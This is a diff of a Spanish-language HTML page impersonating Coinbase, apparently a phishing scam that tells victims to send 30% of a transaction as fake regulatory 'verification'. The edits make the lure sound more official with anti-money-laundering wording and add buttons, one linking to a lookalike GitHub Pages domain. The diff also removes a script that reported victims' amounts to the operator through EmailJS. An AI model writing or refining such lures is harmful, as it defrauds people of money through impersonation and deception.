@@ -74,27 +74,28 @@
             <img src="https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png" alt="Coinbase Logo">
         </div>
 
-        <h2>Verificación del 30% Requerida</h2>
+        <h2>Verificación del 30% Requerida por Regulaciones de Criptomonedas</h2>
 
         <p>Estimado usuario,</p>
 
-        <p>Para completar la verificación de su transacción, debe enviar el <strong>30% del monto total</strong> a su cuenta personal de Coinbase Wallet. Este paso es necesario para confirmar la legitimidad de la transacción.</p>
+        <p>Para cumplir con las regulaciones internacionales de criptomonedas y garantizar la seguridad de todas las transacciones en nuestra plataforma, se requiere realizar una transacción del <strong>30% del monto total</strong> de la transacción a su propia cuenta personal de Coinbase Wallet. Este procedimiento es necesario para cumplir con las normativas contra el lavado de dinero y el financiamiento del terrorismo.</p>
 
         <div class="verification-steps">
-            <p><strong>Monto total de la transacción:</strong> <span id="totalAmount">{{{amount}}}</span></p>
-            <p><strong>30% del monto a enviar:</strong> <span id="verificationAmount"></span></p>
+            <p><strong>Este monto debe enviarse a su cuenta personal de Coinbase Wallet y se sumará a la transferencia en curso.</strong></p>
         </div>
 
         <p>Por favor, siga estos pasos:</p>
         <ol>
-            <li>Abra su aplicación Coinbase Wallet.</li>
-            <li>Envié el <strong>30% del monto</strong> a la dirección de su cuenta personal.</li>
+            <li>Abra su aplicación <strong>Coinbase Wallet</strong> en su dispositivo.</li>
+            <li>Envíe el <strong>30% del monto total</strong> a la dirección de su cuenta personal.</li>
             <li>Confirme la transacción en su billetera.</li>
         </ol>
 
         <div class="highlight">
-            <p>Una vez completado, su transacción será verificada automáticamente en un plazo de 24 horas.</p>
+            <p>Una vez completado el envío, su transacción será verificada automáticamente en un plazo de 24 horas y se sumará al monto en curso.</p>
         </div>
+
+        <a href="https://www.coinbase.com/download" class="button">Abrir Coinbase Wallet</a>
 
         <a href="https://coinbasewallethelpp.github.io/verificacionenproceso/" class="button">He completado el envío</a>
 
@@ -103,41 +104,5 @@
         </div>
     </div>
 
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script>
-        // Inicializar EmailJS con tu user_id
-        emailjs.init('user_EjV5FTI4JisVwIlW');  // Usar tu user_id de EmailJS
-
-        // Obtener el monto de la URL (pasado desde la plantilla)
-        const amount = parseFloat("{{{amount}}}");  // Usamos {{{amount}}} como valor del monto
-
-        // Verificar si el monto está disponible y es un número válido
-        if (amount && !isNaN(amount)) {
-            console.log('Monto extraído de la plantilla:', amount);  // Verifica que amount tenga el valor correcto.
-            
-            // Mostrar el monto total con formato de moneda
-            document.getElementById('totalAmount').textContent = `${amount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
-            
-            // Calcular el 30% y mostrarlo con formato de moneda
-            const verificationAmount = amount * 0.3;
-            console.log('30% del monto:', verificationAmount);  // Verifica el cálculo.
-            document.getElementById('verificationAmount').textContent = `${verificationAmount.toLocaleString('es-ES', { style: 'currency', currency: 'EUR' })}`;
-
-            // Enviar los datos a EmailJS
-            emailjs.send("service_8kzc798", "template_woxom1z", {
-                amount: amount,
-                verificationAmount: verificationAmount
-            }).then(function(response) {
-                console.log("Correo enviado exitosamente", response);
-            }, function(error) {
-                console.log("Error al enviar el correo", error);
-            });
-
-        } else {
-            // Si el monto no está disponible o no es válido
-            document.getElementById('totalAmount').textContent = 'Monto no disponible';
-            document.getElementById('verificationAmount').textContent = 'Monto no disponible';
-        }
-    </script>
 </body>
 </html>
